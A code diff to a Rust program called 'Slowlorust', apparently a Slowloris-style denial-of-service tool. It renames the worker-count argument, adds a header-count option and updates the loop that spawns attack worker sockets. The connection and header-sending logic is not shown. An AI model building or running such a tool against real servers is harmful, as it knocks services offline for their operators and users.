@@ -20,7 +20,10 @@ struct Slowlorust {
     port: String,
     /// How many worker sockets to open
     #[clap(short, long, default_value = "50")]
-    num_workers: u16,
+    worker_count: u16,
+    /// How many headers to send before restarting a worker
+    #[clap(short, long, default_value = "10")]
+    header_count: u8,
     /// Lower bound of request delay in seconds
     #[clap(short, long, default_value = "0")]
     lower_sleep: u8,
@@ -66,11 +69,17 @@ fn main() {
     }
 
     info!("Starting workers...");
-    let mut pool = Pool::new(args.num_workers as u32);
+    let mut pool = Pool::new(args.worker_count as u32);
     let mut num_workers = 0;
     pool.scoped(|scoped| {
-        while num_workers < args.num_workers {
-            if let Ok(mut worker) = Worker::new(num_workers, conn_str.clone(), (args.lower_sleep, args.upper_sleep), args.verbose) {
+        while num_workers < args.worker_count {
+            if let Ok(mut worker) = Worker::new(
+                num_workers,
+                conn_str.clone(),
+                args.header_count,
+                (args.lower_sleep, args.upper_sleep),
+                args.verbose,
+            ) {
                 if args.verbose > 0 {
                     info!("[slowlorust_{:03}] Spawned.", num_workers);
                 }
@@ -78,7 +87,7 @@ fn main() {
                     worker.start();
                 });
                 num_workers += 1;
-                if args.verbose == 0 && num_workers % cmp::max(args.num_workers / 5, 1) == 0 {
+                if args.verbose == 0 && num_workers % cmp::max(args.worker_count / 5, 1) == 0 {
                     println!(" | \t{:03} workers spawned.", num_workers);
                 }
             }
